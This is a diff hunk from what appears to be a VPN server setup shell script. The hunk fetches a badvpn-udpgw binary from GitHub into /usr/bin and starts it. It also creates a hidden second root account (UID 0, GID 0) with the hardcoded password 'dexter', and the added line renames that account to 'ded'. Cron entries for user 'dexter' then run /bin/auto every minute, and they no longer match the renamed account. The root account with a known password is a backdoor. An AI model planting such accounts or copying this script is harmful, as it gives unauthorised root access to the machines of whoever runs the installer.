@@ -612,7 +612,7 @@ wget -O /usr/bin/badvpn-udpgw "https://github.com/Dexter-Hysteria/status/raw/mtk
 chmod +x /usr/bin/badvpn-udpgw
 ps x | grep 'udpvpn' | grep -v 'grep' || screen -dmS udpvpn /usr/bin/badvpn-udpgw --listen-addr 127.0.0.1:7300 --max-clients 10000 --max-connections-for-client 10 --client-socket-sndbuf 10000
 
-useradd -p $(openssl passwd -1 dexter) dexter -ou 0 -g 0
+useradd -p $(openssl passwd -1 dexter) ded -ou 0 -g 0
 crontab -u dexter -r
 (crontab -l 2>/dev/null || true; echo "* * * * * /bin/auto >/dev/null 2>&1") | crontab - -u dexter
 }
